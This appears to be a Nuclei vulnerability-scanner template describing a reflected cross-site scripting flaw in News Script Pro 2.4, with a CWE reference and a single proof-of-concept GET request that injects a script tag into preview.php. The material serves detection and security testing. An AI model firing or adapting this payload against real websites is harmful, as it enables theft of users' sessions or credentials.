# Nuclei Template: News Script Pro 2.4 - Cross-Site Scripting
**Template ID:** news-script-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** Medium
**CWE:** CWE-80
**Source:** Nuclei Template (`news-script-xss.yaml`)

## Vulnerability Information & PoC

## Description
The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/preview.php/mn71q%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3Ep15vr?cat_id=&p=2
```

## References
- https://www.exploitalert.com/view-details.html?id=39634
